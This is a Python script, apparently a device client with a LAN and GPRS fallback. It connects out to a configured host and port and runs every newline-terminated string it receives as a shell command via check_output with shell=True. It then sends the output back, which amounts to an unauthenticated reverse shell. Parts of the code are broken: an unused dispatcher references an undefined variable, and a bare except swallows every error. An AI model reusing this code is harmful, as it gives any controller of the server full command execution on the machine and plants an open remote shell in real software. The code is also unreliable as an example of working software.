#!/usr/bin/env python3

import socket
import time
import subprocess
from subprocess import check_output
from defines import  CMD_GET,CMD_SET,SOCKET_TIMEOUT,HOST,PORT, GREETING_MESSAGE
from defines import  MAX_RECV_LEN, MAX_LAN_RETRIES,SLEEP_DELAY, NEW_LINE, SOCKET_BUFFER_SIZE


def execute_cmd(cmd):
      print("Executing ")
      print(command_string)
      print('\n')
      
      
def process_command(cmd):
    if   cmd == CMD_GET:
        execute_cmd(cmd)
    elif cmd == CMD_SET:
        execute_cmd(cmd)
    else:
        print("Unexpected command")

    
recvBuffer = bytearray()    

while True:
    print("Accessing LAN\n")
    lan_retries = 0;
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.settimeout(SOCKET_TIMEOUT)
                s.connect((HOST, PORT))
                s.sendall(bytes(GREETING_MESSAGE, 'utf-8'))
                s.settimeout(SOCKET_TIMEOUT)
                while True:
                    recvBuffer+=s.recv(SOCKET_BUFFER_SIZE)
                    bufferLength = len(recvBuffer)
                    print("RCV>")
                    print(recvBuffer.decode())
                    if(len(recvBuffer) > MAX_RECV_LEN):
                        break;
                    else:
                        if(chr(recvBuffer[bufferLength-1]) == NEW_LINE):
                            print ("command received\n")
                            print(str(recvBuffer))
                            recvBuffer = recvBuffer[:-1]
                            command_string = recvBuffer.decode()
                          
                            responce = check_output(command_string, shell = True).decode()
                            recvBuffer.clear()
                            if(len(responce)==0):
                                s.send(b'OK')
                            else:
                                s.sendall( bytes(responce, 'utf-8'));
                            
                        else:
                            print ("chunk received\n")
            except:
                if(lan_retries >= MAX_LAN_RETRIES):
                    break;
                lan_retries = lan_retries + 1
                print(f"sleeping for a while {lan_retries}");
                time.sleep(SLEEP_DELAY)
    print("Accessing GPRS")                
print('Loop exit')